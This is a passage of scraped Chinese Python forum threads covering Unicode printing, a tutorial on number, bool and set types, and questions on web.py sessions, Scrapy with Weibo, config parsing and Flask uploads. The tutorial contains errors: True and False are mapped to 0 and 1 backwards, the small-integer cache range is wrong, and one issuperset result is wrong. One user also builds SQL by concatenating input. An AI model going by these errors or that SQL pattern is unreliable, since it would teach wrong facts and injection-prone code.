"results = cur.fetchone() \r", "\r", "print results \r", "改成\r", "cur.execute(sql+entering) \r", "results = cur.fetchone() \r", "\r", "for result in results:\r", "    print result\r", "\r", "Python print 的时候会自动将 unicode str 自动编码为合适的编码。你一开始 print 的是个 tuple 所以没有自动编码", "这个不是编码问题，只是 print 打印嵌在其它结构里的字符串会默认 escape 模式。 shell 的话一般直接打印字符串本身就没事了，如 print result[0]。", "解决了吗？我访问 mssql 也是，不给如果显示我转码 lantin ，然后 utf-8 解码", "用 python3 吧", "   感谢，解决了 print 中文的话还要加一个 str \r", "for result in results:\r", "   print str(result)", " 谢谢指教，你的方法也可以。", " mysql 吗？  上面的程序可以解决，数字，中英文输入输出", " 找不到解决方法的时候我也是这样想的，可我只是写一部分，并不能吧别人的部分也让用 3 ～～～", " 所以这就是 python 的悲剧之处，\r", "\r", "缺乏静态类型检查 本来就不特别适合协作开发\r", "结果还搞了个 python2.7 python3 不兼容", " \r", "抱歉，手机打字好几个错别字。\r", "我使用的是 pymssql 链接的 mssql 数据库，也有乱码。\r", "网上建议是执行的时候先 utf-8 编码下，查询到结果首先编码为 utf-8 ，数据库链接设置编码格式为 utf-8\r", "\r", "你试试转码后是否显示乱码。\r", "d=result[0][0].encode(“ latin-1 ”).decode(“ gbk ”)\r", "试试 print d", " SyntaxError: invalid syntax\r", "ubuntu@VM-18-113-ubuntu:~$ python /home/ubuntu/fetch3.py\r", "please enter : hi\r", "h\r", "ubuntu@VM-18-113-ubuntu:~$ python /home/ubuntu/fetch3.py\r", "please enter : 吃饭\r", "Traceback (most recent call last):\r", "  File \"/home/ubuntu/fetch3.py\", line 29, in <module>\r", "    d=results[0][0].encode(\"latin-1\").decode(\"gbk\")\r", "UnicodeEncodeError: 'latin-1' codec can't encode character u'\\u997f' in position 0: ordinal not in range(256)\r", "ubuntu@VM-18-113-ubuntu:~$ python /home/ubuntu/fetch3.py\r", "please enter : hi\r", "h\r", "ubuntu@VM-18-113-ubuntu:~$ python /home/ubuntu/fetch3.py\r", "please enter : 吃饭\r", "Traceback (most recent call last):\r", "  File \"/home/ubuntu/fetch3.py\", line 29, in <module>\r", "    d=results[0][0].encode(\"latin-1\").decode(\"gbk\")\r", "UnicodeEncodeError: 'latin-1' codec can't encode character u'\\u997f' in position 0: ordinal not in range(256)\r", "\r", "\r", "\r", "数字，英文都可以，中文不行～～～", " 我也感觉不兼容各种坑～～～   ， 但是有时候升级也是变革嘛，就像 intel 新款的 cpu 也不能装 xp", " 我是用 json.dumps 和 json.loads()"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>上篇文章中我们简单的体验了 Python 语言基本概念与语法，那么在继续深入下去的过程中，不妨先学习几个常见的 Python 内置数据类型？这也是大部分 Python 教科书的学习目录，由浅至深，慢慢深入。</p>\n<p>Python 常用的几种数据类型就是以下几种，其实 Python 内部的数据类型还是很多的，多归多但是很少有我们用到了，太多了也记不了，把常用的几个玩熟练了就 OK 了。</p>\n<p>那么接下来我们会学到那些内置的数据类型呢？</p>\n<p><img alt=\"Python-basic-data-types\" src=\"https://blog.ansheng.me/static/uploads/2016/12/1483016670.png\"></p>\n<p>虽然说我们是在学习数据类型，但其实只是在学习每一个类型所提供的 API 而已，你所需要的大部分功能， Python 都已经帮我们封装好了，不需要担心任何效率的问题，当你熟悉了这些 API 之后，灵活的组合应用，因为这在开发的过程中是必不可少的，那么接下来就让我们开始漫长的数据类型 API 学习之旅吧。</p>\n<p>所有的数据类型所具备的方法都存在相对应的类里面，当创建一个类型的对象时，该对象所具备的功能都保存在相应的类中。</p>\n<h2>数字</h2>\n<p>在 Python3 中，整型、长整型、浮点数、负数、布尔值等都可以称之为数字类型。</p>\n<p><strong>创建数字类型类型的对象</strong></p>\n<p><code>int</code>类型通常都是数字，创建数字类型的方式有两种，且在创建的时候值两边不需要加双引号或单引号。</p>\n<p>第一种创建整型的方式</p>\n<pre><code>&gt;&gt;&gt; number = 9\n&gt;&gt;&gt; type(number)\n&lt;class 'int'&gt;\n</code></pre>\n<p>第二种创建整型的方式</p>\n<pre><code>&gt;&gt;&gt; number = int(9)\n&gt;&gt;&gt; type(number)\n&lt;class 'int'&gt;\n</code></pre>\n<p>以上两种创建整型对象的方式都可以创建的，但是他们也是有本质上的区别，第一种方式实际上会转换成第二种方式，然后第二种方式会把括号内的数据交给<code>__init__</code>这个构造方法，构造方法是<code>int</code>类的，然后构造方法会在内存中开辟一块空间用来存放数据，但实际上我们在用时候是没有任何区别的。</p>\n<p>构造方法每个数据类型中都会有，这是 Python 内部所定义的，如下图所示：</p>\n<p><img alt=\"Python-Day03-02\" src=\"https://blog.ansheng.me/static/uploads/2016/12/1483016717.png\"></p>\n<p><code>__init__</code></p>\n<pre><code>def __init__(self, x, base=10): # known special case of int.__init__\n</code></pre>\n<p>可以从源码中看到，<code>__init__</code>的方法有两个参数，其中<code>base=10</code>是可选的参数，<code>x</code>是我们对象的值，<code>base=10</code>其实就是说把我们的值(默认二进制)以十进制的方式输出出来，通过下面的实例可以看到：</p>\n<pre><code>&gt;&gt;&gt; var=int('0b100',base=2)\n&gt;&gt;&gt; var\n4\n</code></pre>\n<p>通过 int()可以将一个数字的字符串变成一个整数，并且如果你指定了第二个参数，还可以将值进制数转换为整数：</p>\n<pre><code># 将数字字符串转换为整数，数字字符串通过进制转换为整数\n&gt;&gt;&gt; int('99'),int('100',8),int('40',16),int('10000000',2)\n(99, 64, 64, 128)\n# 讲进制数转换为整数\n&gt;&gt;&gt; int('0x40',16),int('0b1000000',2)\n(64, 64)\n</code></pre>\n<p>把二进制的数字 4 通过十进制输出出来， 4 的二进制就是<code>0b100</code>，又有一个知识点就是在类的方法中，所有以<code>__</code>开头，并且以<code>__</code>结尾的方法都是 Python 内部自己去调用的，我们在写代码的过程中是不需要去调用的，最简单的例子就是<code>__init__</code>，通过上面的流程图我们就可以很清楚的看到。</p>\n<h3>int 内部优化机制</h3>\n<p>下图中我们可以很清楚的看到 int 类型在创建对象时内存所分配空间的情况</p>\n<p><img alt=\"Python-Day03-03\" src=\"https://blog.ansheng.me/static/uploads/2016/12/1483016740.png\"></p>\n<p>首先我们知道当我们创建第一个对象 var1 的时候会在内存中开辟一块空间作为存放 var1 对象的值用的，当我们创建第二个对象 var2 的时候也会在内存中开辟一块空间来作为 var2 对象的值，那如果这样说，那是不是说对象 var1 和 var2 的值内存是否会同时开辟两块呢？我们通过下面的实例可以得到答案：</p>\n<pre><code>C:\\Users\\anshe&gt;c:\\Python35\\python.exe\n# 注意我是用的是 Python3.5.1\nPython 3.5.1 (v3.5.1:37a07cee5969, Dec  6 2016, 01:54:25) [MSC v.1900 64 bit (AMD64)] on win32\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n# 分别创建对象 var1 和 var2\n&gt;&gt;&gt; var1=123\n&gt;&gt;&gt; var2=123\n# 我们可以看到他们的内存地址都是指向的`1502084720`\n&gt;&gt;&gt; id(var1)\n1502084720\n&gt;&gt;&gt; id(var2)\n1502084720\n</code></pre>\n<p>通过上面的结果我们可以看到 var1 和 var2 的内存地址是相同的，就代表他们的值是使用的同一块空间，那么如果我把 var2 的值改为 456 呢？</p>\n<pre><code>&gt;&gt;&gt; var2=456\n&gt;&gt;&gt; id(var1)\n1502084720\n&gt;&gt;&gt; id(var2)\n2452305956816\n</code></pre>\n<p>可以看到 var2 的内存地址已经改变了（废话），因为对象的值不一样了，所以他才不会改变， OK ，我们可以得到一个结论就是：当两个或者多个对象的值都是同一个的时候，那么这些对象都会使用同一个内存地址，这里的值是是有范围的，默认范围是<code>-5~257</code>，得到这个结论之后我们继续往下看。</p>\n<p><img alt=\"Python-Day03-04\" src=\"https://blog.ansheng.me/static/uploads/2016/12/1483016781.png\"></p>\n<p>这张图我们同样创建了两个对象，但是唯一不同的是我把第一个创建的对象的值作为第二个对象的值，这里他们肯定使用的是同一个内存地址，但是如果我把第一个对象的值改动了呢？</p>\n<pre><code>&gt;&gt;&gt; var1=123\n&gt;&gt;&gt; var2=var1\n&gt;&gt;&gt; id(var1)\n1502084720\n&gt;&gt;&gt; id(var2)\n1502084720\n&gt;&gt;&gt; var1=456\n&gt;&gt;&gt; id(var1)\n2452305956816\n&gt;&gt;&gt; id(var2)\n1502084720\n</code></pre>\n<p>请自行思考，这里不多做解释，然后下面我们再来说说刚才的话题，说在<code>-5~257</code>这个范围内对象的值都会引用同一块内存地址，我们可以通过下面的实验来测试：</p>\n<pre><code>&gt;&gt;&gt; var1=12345\n&gt;&gt;&gt; var2=12345\n&gt;&gt;&gt; id(var1)\n2452305956816\n&gt;&gt;&gt; id(var2)\n2452308384720\n</code></pre>\n<p>事实证明我们的结论是完全没有问题的，注意我上面的实例都是在<code>Python3.5</code>上面执行的哦，<code>var1</code>和<code>var2</code>两个对象的值同样是 12345 ，但是他们的内存地址就是不一样，这就是 Python 在内部做的优化，他把<code>-5~257</code>这个范围内我们常用道德数字多对象可引用的， OK ，到此结束这个话题。</p>\n<h3>数字类型的长度限制</h3>\n<p>数字类型在<code>python2.7</code>里面是分整型和长整型这个区别的，也就是说如果你的数字大到一定的范围，那么 python 会把它转换为长整形，一个数字类型包含 32 位，可以存储从<code>-2147483648</code>到<code>214483647</code>的整数。</p>\n<p>一个<code>长整(long)</code>型会占用更多的空间， 64 位的可以存储<code>-922372036854775808</code>到<code>922372036854775808</code>的整数。</p>\n<p>python3 里 long 型已经不存在了，而 int 型可以存储到任意大小的整型，甚至超过 64 为。</p>\n<p>Python 内部对整数的处理分为普通整数和长整数，普通整数长度为机器位长，通常都是 32 位，超过这个范围的整数就自动当长整数处理，而长整数的范围几乎完全没限制，如下：</p>\n<ul>\n<li>Python2.7.x</li>\n</ul>\n<pre><code>&gt;&gt;&gt; var=123456\n&gt;&gt;&gt; var\n123456\n&gt;&gt;&gt; var=10**20\n&gt;&gt;&gt; var\n100000000000000000000L\n&gt;&gt;&gt; type(var)\n# long 就是长整型\n&lt;type 'long'&gt;\n</code></pre>\n<ul>\n<li>Python3.5.x</li>\n</ul>\n<pre><code>&gt;&gt;&gt; var=123456789\n&gt;&gt;&gt; var\n123456789\n&gt;&gt;&gt; var=10**20\n&gt;&gt;&gt; var\n100000000000000000000\n&gt;&gt;&gt; type(var)\n&lt;class 'int'&gt;\n</code></pre>\n<p>请自行补脑 - - 、</p>\n<h3>数字类型所具备的方法</h3>\n<p><strong>bit_length</strong></p>\n<p>返回表示该数字时占用的最少位数</p>\n<pre><code>&gt;&gt;&gt; num=20\n&gt;&gt;&gt; num.bit_length()\n5\n</code></pre>\n<p><strong>conjugate</strong></p>\n<p>返回该复数的共轭复数，复数，比如 0+2j,其中 num.real,num.imag 分别返回其实部和虚部， num.conjugate()，返回其共扼复数对象</p>\n<pre><code>&gt;&gt;&gt; num =-20\n&gt;&gt;&gt; num.conjugate()\n-20\n&gt;&gt;&gt; num=0+2j\n&gt;&gt;&gt; num.real\n0.0\n&gt;&gt;&gt; num.imag\n2.0\n&gt;&gt;&gt; num.conjugate()\n-2j\n</code></pre>\n<p><strong>imag</strong></p>\n<p>返回复数的虚数</p>\n<pre><code>&gt;&gt;&gt; number = 10\n&gt;&gt;&gt; number.imag\n0\n&gt;&gt;&gt; number = 3.1415926\n&gt;&gt;&gt; number.imag\n0.0\n</code></pre>\n<p>内置的方法还有<code>denominator</code>、<code>from_bytes</code>、<code>numerator</code>、<code>real</code>、<code>to_bytes</code>，实在搞不懂这有什么用，也不太理解，就不做介绍了，你可以通过<code>help(int.numerator)</code>查看该方法的帮助信息等。</p>\n<h3>混合类型</h3>\n<p>所谓混合类型就是浮点数和整数进行运算，如下所示：</p>\n<pre><code>&gt;&gt;&gt; 3.14159 + 10\n13.14159\n</code></pre>\n<p>结果和我们想象中的一样，但是一个浮点数一个正整数它是怎么进行相加的呢？其实很简单， Python 会把两个值转换为其中最复杂的那个对象的类型，然后再对相同类型运算。</p>\n<p>比如上面的例子中，会先把<code>10</code>转换为<code>10.0</code>然后再与<code>3.14159</code>相加。</p>\n<p><strong>数字类型的复杂度</strong></p>\n<p>整数比浮点数简单、浮点数比复数简单。</p>\n<h2>布尔类型(bool)</h2>\n<p>布尔类型其实就是数字 0 和 1 的变种而来，即<code>真（ True/0 ）</code>或<code>假（ False/1 ）</code>，实际上就是内置的数字类型的子类而已。</p>\n<pre><code># 如果 0 不是真，那么就输出'0 is False.'\n&gt;&gt;&gt; if not 0: print('0 is False.')\n... \n0 is False.\n# 如果 1 是真，那么就输出'1 is True.'\n&gt;&gt;&gt; if 1: print('1 is True.')\n... \n1 is True.\n</code></pre>\n<p>你还可以使用布尔值进行加减法，虽然从来没在任何代码中见过这种形式：</p>\n<pre><code>&gt;&gt;&gt; True + 1\n# 1 + 1 = 2\n2\n&gt;&gt;&gt; False + 1\n# 0 + 1 = 1\n1\n</code></pre>\n<h2>集合(set)</h2>\n<p>集合的元素是不允许重复、不可变且无序的集合，集合就像是字典舍弃了值一样，集合中的元素只能够出现一切且不能重复。</p>\n<p>创建 set 集合</p>\n<pre><code>&gt;&gt;&gt; s = set([11,22,33])\n&gt;&gt;&gt; s\n{33, 11, 22}\n&gt;&gt;&gt; type(s)\n&lt;class 'set'&gt;\n</code></pre>\n<p>第二种不常用创建 set 集合的方式</p>\n<pre><code># 这种的创建方式，集合中的元素相当于字典中的 key\n&gt;&gt;&gt; s = {11,22,33}\n&gt;&gt;&gt; type(s)\n&lt;class 'set'&gt;\n&gt;&gt;&gt; s\n{33, 11, 22}\n</code></pre>\n<p>把其它可迭代的数据类型转换为 set 集合</p>\n<pre><code>&gt;&gt;&gt; li = [\"a\",\"b\",\"c\"]\n&gt;&gt;&gt; seting = set(li)\n&gt;&gt;&gt; seting\n{'b', 'a', 'c'}\n&gt;&gt;&gt; type(seting)\n&lt;class 'set'&gt;\n</code></pre>\n<p>集合同样支持表达式操作符</p>\n<pre><code># 首先创建两个集合\n&gt;&gt;&gt; x = set('abcde')\n&gt;&gt;&gt; y = set('bdxyz')\n&gt;&gt;&gt; x\n{'a', 'd', 'b', 'c', 'e'}\n&gt;&gt;&gt; y\n{'y', 'd', 'b', 'x', 'z'}\n# 使用 in 进行成员检测\n&gt;&gt;&gt; 'a' in x\nTrue\n# 差集\n&gt;&gt;&gt; x - y\n{'a', 'e', 'c'}\n# 并集\n&gt;&gt;&gt; x | y\n{'b', 'y', 'z', 'a', 'd', 'e', 'c', 'x'}\n# 交集\n&gt;&gt;&gt; x &amp; y\n{'d', 'b'}\n# 对称差\n&gt;&gt;&gt; x ^ y\n{'y', 'z', 'a', 'e', 'c', 'x'}\n# 比较\n&gt;&gt;&gt; x &gt; y, x &lt; y\n(False, False)\n</code></pre>\n<p>集合解析</p>\n<pre><code>&gt;&gt;&gt; {x for x in 'abc'}\n{'a', 'b', 'c'}\n&gt;&gt;&gt; {x+'b' for x in 'abc'}\n{'bb', 'cb', 'ab'}\n</code></pre>\n<h3>集合所提供的方法</h3>\n<p><strong>add</strong></p>\n<p>往集合内添加元素</p>\n<pre><code>&gt;&gt;&gt; se = { 11, 22, 33 }\n&gt;&gt;&gt; se\n{33, 11, 22}\n# 元素写在小括号内\n&gt;&gt;&gt; se.add(44)\n&gt;&gt;&gt; se\n{33, 11, 44, 22}\n</code></pre>\n<p><strong>clear</strong></p>\n<p>清除集合内容</p>\n<pre><code>&gt;&gt;&gt; se = { 11, 22, 33 }\n&gt;&gt;&gt; se\n{33, 11, 22}\n&gt;&gt;&gt; se.clear()\n&gt;&gt;&gt; se\nset()\n</code></pre>\n<p><strong>copy 浅拷贝</strong></p>\n<p>下文介绍\n \n<strong>difference</strong></p>\n<p>寻找集合的元素 var1 中存在， var2 中不存在的</p>\n<pre><code>&gt;&gt;&gt; var1 = { 11, 22, 33 }\n&gt;&gt;&gt; var2 = { 22 ,55 }\n&gt;&gt;&gt; var1.difference(var2)\n{33, 11}\n&gt;&gt;&gt; var2.difference(var1)\n{55}\n</code></pre>\n<p><strong>difference_update</strong></p>\n<p>寻找集合的元素 var1 中存在， var2 中不存在的元素，并把查找出来的元素重新复制给 var1</p>\n<pre><code>&gt;&gt;&gt; var1 = { 11, 22, 33 }\n&gt;&gt;&gt; var2 = { 22 ,55 }\n&gt;&gt;&gt; var1.difference_update(var2)\n&gt;&gt;&gt; var1\n{33, 11}\n</code></pre>\n<p><strong>discard</strong></p>\n<p>移除指定元素，不存在不保错</p>\n<pre><code>&gt;&gt;&gt; var1 = { 11, 22, 33 }\n&gt;&gt;&gt; var1.discard(11)\n&gt;&gt;&gt; var1\n{33, 22}\n&gt;&gt;&gt; var1.discard(1123123)\n&gt;&gt;&gt; var1\n{33, 22}\n</code></pre>\n<p><strong>remove</strong></p>\n<p>移除指定元素，不存在保错</p>\n<pre><code>&gt;&gt;&gt; var1 = { 11, 22, 33 }\n&gt;&gt;&gt; var1\n{33, 11, 22}\n&gt;&gt;&gt; var1.remove(11)\n&gt;&gt;&gt; var1\n{33, 22}\n&gt;&gt;&gt; var1.remove(asda)\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nNameError: name 'asda' is not defined\n</code></pre>\n<p><strong>intersection</strong></p>\n<p>交集，查找元素中都存在的值</p>\n<pre><code>&gt;&gt;&gt; var1 = { 11, 22, 33 }\n&gt;&gt;&gt; var2 = { 22, 55, \"一二\" }\n&gt;&gt;&gt; var1.intersection(var2)\n{22}\n</code></pre>\n<p><strong>intersection_update</strong></p>\n<p>取交集并更更新到 A 中</p>\n<pre><code>&gt;&gt;&gt; var1 = { 11, 22, 33 }\n&gt;&gt;&gt; var2 = { 22, 55, \"一二\" }\n&gt;&gt;&gt; var1.intersection_update(var2)\n&gt;&gt;&gt; var1\n{22}\n</code></pre>\n<p><strong>isdisjoint</strong></p>\n<p>判断有没有交集，如果有返回 False ，否则返回 True</p>\n<pre><code>&gt;&gt;&gt; var1 = { 11, 22, 33 }\n&gt;&gt;&gt; var2 = { 22, 44, 55 }\n&gt;&gt;&gt; var1.isdisjoint(var2)\nFalse\n&gt;&gt;&gt; var2 = { 66, 44, 55 }\n&gt;&gt;&gt; var1.isdisjoint(var2)\nTrue\n</code></pre>\n<p><strong>issubset</strong></p>\n<p>是否是子序列,也就是说如果 var2 的所有元素都被 var1 所包含了，那么 var2 就是 var1 的子序列</p>\n<pre><code>&gt;&gt;&gt; var1 = {11,22,33,44}\n&gt;&gt;&gt; var2 = {11,22}\n&gt;&gt;&gt; var2.issubset(var1)\nTrue\n</code></pre>\n<p><strong>issuperset</strong></p>\n<p>是否是父序列</p>\n<pre><code>&gt;&gt;&gt; var1 = { 11, 22, 33 }\n&gt;&gt;&gt; var2 = { 22, 44, 55 }\n&gt;&gt;&gt; var1.issuperset(var2)\nTrue\n</code></pre>\n<p><strong>pop</strong></p>\n<p>移除一个元素，并显示移除的元素，移除时是无序的</p>\n<pre><code>&gt;&gt;&gt; var1 = {11,22,33,44}\n&gt;&gt;&gt; var1.pop()\n33\n&gt;&gt;&gt; var1\n{11, 44, 22}\n</code></pre>\n<p><strong>symmetric_difference</strong></p>\n<p>对称交集，把 var1 存在且 b 不存在和 var2 存在且 var1 不存在的元素合在一起</p>\n<pre><code>&gt;&gt;&gt; var1 = { 11, 22, 33, 44 }\n&gt;&gt;&gt; var2 = { 11, 22, 77, 55 }\n&gt;&gt;&gt; var1.symmetric_difference(var2)\n{33, 44, 77, 55}\n</code></pre>\n<p><strong>symmetric_difference_update</strong></p>\n<p>对称交集，并更新到 var1 中</p>\n<pre><code>&gt;&gt;&gt; var1 = { 11, 22, 33, 44 }\n&gt;&gt;&gt; var2 = { 11, 22, 77, 55 }\n&gt;&gt;&gt; var1\n{33, 11, 44, 22}\n&gt;&gt;&gt; var1.symmetric_difference_update(var2)\n&gt;&gt;&gt; var1\n{33, 44, 77, 55}\n</code></pre>\n<p><strong>union</strong></p>\n<p>并集，把两个集合中的所有元素放在一起，如果有重复的则只存放一个</p>\n<pre><code>&gt;&gt;&gt; var1 = { 11, 22, 33, 44 }\n&gt;&gt;&gt; var2 = { 11, 22, 77, 55 }\n&gt;&gt;&gt; var1.union(var2)\n{33, 11, 44, 77, 22, 55}\n</code></pre>\n<p><strong>update</strong></p>\n<p>更新，把一个集合中的元素更新到另一个集合中</p>\n<pre><code>&gt;&gt;&gt; var1 = { 11, 22, 33, 44 }\n&gt;&gt;&gt; var2 = { 11, 22, 77, 55 }\n&gt;&gt;&gt; var1.update(var2)\n&gt;&gt;&gt; var1\n{33, 11, 44, 77, 22, 55}\n</code></pre>\n<hr>\n<h2><a href=\"https://blog.ansheng.me/article/python-full-stack-way-digital-data-type/\" rel=\"nofollow\">原文链接</a></h2>\n<h2><a href=\"https://blog.ansheng.me/article/python-full-stack-way/\" rel=\"nofollow\">Python 全栈之路系列文章</a></h2>\n</div></div>"], "reply": "目前尚无回", "tittle": "Python 全栈之路系列之数字数据类型", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>初学 python ，在用 <a href=\"http://web.py\" rel=\"nofollow\">web.py</a> 做 demo 练手，到 session 卡住了</p>\n<pre><code>web.config.session_parameters['cookie_name'] = 'session_id'\nweb.config.session_parameters['cookie_domain'] = None\nweb.config.session_parameters['timeout'] = 86400,\nweb.config.session_parameters['ignore_expiry'] = True\nweb.config.session_parameters['ignore_change_ip'] = True\nweb.config.session_parameters['secret_key'] = 'HhOduSa2Ly4uVrWg'\nweb.config.session_parameters['expired_message'] = 'Session expired'\nsession = web.session.Session(app, web.session.DiskStore('data/sessions'), initializer={'login': False})\n\ndef session_hook():\n    web.ctx.session = session\n\napp.add_processor(web.loadhook(session_hook))\n</code></pre>\n<p>在页面里用 <code>$username</code> 取值 （username 是我保存在 session 里数据的对象），运行报错</p>\n<pre><code>NameError: global name 'username' is not defined\n</code></pre>\n<p>求解！</p>\n</div></div>"], "reply": "11", "tittle": "webpy 开发网站，页面里可以取 session 数据吗？怎么取？", "comment": ["$username?php?python?..............", "r#1 @", " web.py 是 python web 开发框架", " haoba 没用过", "r#4 @", " 这个代码我复制运行也报错\r", "\r", "AttributeError: 'ThreadedDict' object has no attribute 'session'\r", "\r", "我用的是 templates 写的页面，不是写在 python 文件里的，模板页面里的 session 数据怎么取呢？", "善用搜索 ", "r#6 @", " 谢谢，没搜到才来问的，再次感谢 ：）", " webpy template session 这三个关键词放 google 出来第一条就是", "r#8 @", " 这个。。我搜的是 “ webpy 模板页面里怎么取 session 数据” 找到的都是 webpy 使用 session 的文章 尴尬了", "web.py 是个好框架", " 是的，我就喜欢这个"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>爬其他的 URL 都可以啊，是因为新浪微博被重定向的原因吗？</p>\n<pre><code>import scrapy\nimport re \nfrom scrapy.selector import Selector\nfrom scrapy.http import Request\nfrom tutorial.items import DmozItem\nfrom string import maketrans\nfrom scrapy.contrib.spiders import CrawlSpider, Rule\nfrom scrapy.contrib.linkextractors import LinkExtractor\ndef extractData(regex, content, index=1): \n    r = '0' \n    p = re.compile(regex) \n    m = p.search(content) \n    if m: \n        r = m.group(index) \n    return r \nclass DmozSpider(CrawlSpider):\n    name = \"dmoz\"\n    allowed_domains = [\"weibo.com\"]\n    download_delay = 2\n    rules=[\n        Rule(LinkExtractor(allow=('/')),callback='parse_item',follow=True)\n        ]\n\n    headers = {\n        \"Accept\": \"*/*\",\n        \"Accept-Encoding\": \"gzip, deflate, sdch, br\",\n        \"Accept-Language\": \"zh-CN,zh;q=0.8\",\n        \"Connection\": \"keep-alive\",\n        # \"Host\": \"login.sina.com.cn\",\n        \"Referer\": \"http://weibo.com/\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36\"\n    }\n    cookies = {\n        'ALF':'我的 cookie',\n        'Apache':'我的 cookie',\n        'SCF':'我的 cookie',\n        'SINAGLOBAL':'我的 cookie',\n        'SSOLoginState':'我的 cookie',\n        'SUB':'我的 cookie',\n        'SUBP':'我的 cookie',\n        'SUHB':'我的 cookie',\n        'TC-Page-G0':'我的 cookie',\n        'TC-Ugrow-G0':'我的 cookie',\n        'TC-V5-G0':'我的 cookie',\n        'ULV':'我的 cookie',\n        'UOR':'我的 cookie',\n        'WBStorage':'我的 cookie',\n        'YF-Page-G0':'我的 cookie',\n        'YF-Ugrow-G0':'我的 cookie',\n        'YF-V5-G0':'我的 cookie',\n        '_s_tentry':'-',\n        'log_sid_t':'我的 cookie',\n        'un':'我的 cookie',\n    }\n    def start_requests(self):\n        return [Request(\"http://weibo.com/u/2010226570?refer_flag=1001030101_&amp;is_all=1\",cookies = self.cookies,headers=self.headers)]\n\n    def parse_item(self, response):\n        print \"comehere!\"\n        regexID=r'class=\\\\\"username\\\\\"&gt;(.*)\\&lt;\\\\/h1&gt;'\n        content=response.body\n        item=DmozItem()\n        ID=extractData(regexID,content,1)\n        item['ID']=ID\n        print ID       \n        yield item\n</code></pre>\n<p>控制台输出如下：</p>\n<pre><code>2017-01-08 17:51:34 [scrapy.core.engine] INFO: Spider opened\n2017-01-08 17:51:34 [scrapy.extensions.logstats] INFO: Crawled 0 pages (at 0 pages/min), scraped 0 items (at 0 items/min)\n2017-01-08 17:51:34 [scrapy.extensions.telnet] DEBUG: Telnet console listening on 127.0.0.1:6023\n2017-01-08 17:51:46 [scrapy.downloadermiddlewares.redirect] DEBUG: Redirecting (302) to &lt;GET http://login.sina.com.cn/sso/login.php?url=http%3A%2F%2Fweibo.com%2Fu%2F2010226570%3Frefer_flag%3D1001030101_%26is_all%3D1&amp;_rand=1483869098.691&amp;gateway=1&amp;service=miniblog&amp;entry=miniblog&amp;useticket=1&amp;returntype=META&amp;sudaref=http%3A%2F%2Fweibo.com%2F&amp;_client_version=0.6.23&gt; from &lt;GET http://weibo.com/u/2010226570?refer_flag=1001030101_&amp;is_all=1&gt;\n2017-01-08 17:51:47 [scrapy.downloadermiddlewares.redirect] DEBUG: Redirecting (meta refresh) to &lt;GET http://weibo.com/u/2010226570?refer_flag=1001030101_&amp;is_all=1&amp;sudaref=weibo.com&amp;retcode=6102&gt; from &lt;GET http://login.sina.com.cn/sso/login.php?url=http%3A%2F%2Fweibo.com%2Fu%2F2010226570%3Frefer_flag%3D1001030101_%26is_all%3D1&amp;_rand=1483869098.691&amp;gateway=1&amp;service=miniblog&amp;entry=miniblog&amp;useticket=1&amp;returntype=META&amp;sudaref=http%3A%2F%2Fweibo.com%2F&amp;_client_version=0.6.23&gt;\n2017-01-08 17:51:49 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET http://weibo.com/u/2010226570?refer_flag=1001030101_&amp;is_all=1&amp;sudaref=weibo.com&amp;retcode=6102&gt; (referer: http://weibo.com/)\n2017-01-08 17:51:49 [scrapy.core.engine] INFO: Closing spider (finished)\n</code></pre>\n</div></div>"], "reply": "6", "tittle": "使用 scrapy 爬新浪微博，发现网页被重定向之后没法进入自定义的解析函数了，怎么回事呢？", "comment": ["～", "你不知道只有梁博能搞微博么？", "随便塞点 cookie 就不会重定向了。。。", " 塞了 cookie 重定向之后登录成功了 上面代码里也有 cookie😫", " 啊咧？ 我不太懂？求指教", "建议实施 wap 版的微博"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>是这样，楼主经常用 jinja2 去根据模板生成网络设备的配置文件，再由其他人员将配置刷到设备上，这样做批量化上线时很方便。\n然而对于在线的设备，如何快速校验配置的正确性一直没有好的方法。这过程类似于一个模板的逆向过程，不知道有没有人做过类似的东西？</p>\n</div></div>"], "reply": "14", "tittle": "python 中有没有能解析配置文件的库", "comment": ["yaml 可以吗？", "pyparsing?", "正则", "你的配置文件是什么格式的啊， python 一般都有轮子。", " @", " \r", "cisco 之类的设备，不是通用的配置文件类型，网上找了段，类似这种\r", "```interface Ethernet0\r", "  nameif test\r", "  security-level 10\r", "  ip address 10.10.88.50 255.255.255.254\r", " !\r", " interface Ethernet1\r", "  nameif inside\r", "  security-level 100\r", "  ip address 10.86.194.176 255.255.254.0\r", " !\r", " interface Ethernet2\r", "  shutdown\r", "  no nameif\r", "  security-level 0\r", "  no ip address\r", " !\r", " interface Ethernet3\r", "  shutdown\r", "  no nameif\r", "  security-level 0\r", "  no ip address\r", " !\r", "```", " 正则是个出路，不过似乎造这个轮子成本太高，主要是由于配置文件量大以及不同品牌设备差异大", " 没用过这个，我看下，谢谢", "搞个正则表达式就够了吧。", "视配置复杂程度\r", "\r", "拿正则勉强撸一套\r", "手写 parser\r", "手写 ebnf ，用 antlr 生成 python 的 parser", "递归下降解析器", "ansible 现在都可以直接管理 cisco 设备~", "看一看配置文件的格式是正则语言还是上下文无关语言。如果是正则语言，基本上可以用 regex 匹配。如果是上下文无关语言，就只能自写 parser 了", " \r", "多谢推荐。这个用过些，然而设备厂商属性太强，其他设备不方便，所以倾向于找个通用性的\r", " \r", "同上。。。\r", " \r", " \r", "正则的话复杂度略高...antlr 的话之前没用过，回头研究下，谢谢\r", " \r", "解析器的话会不会太高端了些，怕是我这个小运维搞不定啊。。。"]},
{"content": ["<div class=\"topic_content\">用 flask 做了一个文件上传功能，如何在“ Browse ”里面指定默认路径，比如 C:\\Documents and Settings\\li.ming\\.qq.xls ，那样就可以直接点击“ submit ”，节省一步操作，请前辈指点下，谢谢。</div>"], "reply": "3", "tittle": "flask 文件上传时如何指定默认路径？", "comment": ["file input 不支持 default 值", "ps ， 现代浏览器都自带沙盒，无法直接访问外部文件", " OK ，谢谢！"]},
